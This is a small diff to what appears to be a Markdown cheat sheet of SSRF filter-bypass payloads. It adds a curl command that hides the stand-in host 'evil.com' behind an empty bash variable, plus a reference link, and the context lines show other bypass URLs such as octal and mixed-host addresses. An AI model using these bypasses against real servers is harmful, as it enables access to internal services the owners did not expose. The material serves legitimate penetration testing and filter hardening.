@@ -90,6 +90,13 @@ Bypass using rare address
 http://0/
 ```
 
+Bypass using bash variables (curl only)
+```
+curl -v "http://evil$google.com"
+
+$google = ""
+```
+
 Bypass using tricks combination
 ```
 http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
@@ -108,6 +115,7 @@ List:
 
 
 ## SSRF via URL Scheme
+
 Dict://   
 The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
 ```
@@ -230,3 +238,4 @@ http://0251.00376.000251.0000376/ Dotted octal with padding
 * [AppSecEU15 Server side browsing considered harmful - @Agarri](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
 * [Enclosed alphanumerics - @EdOverflow](https://twitter.com/EdOverflow)
 * [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity](http://www.sxcurity.pro/2017/12/17/hackertarget/)
+* [PHP SSRF @secjuice](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
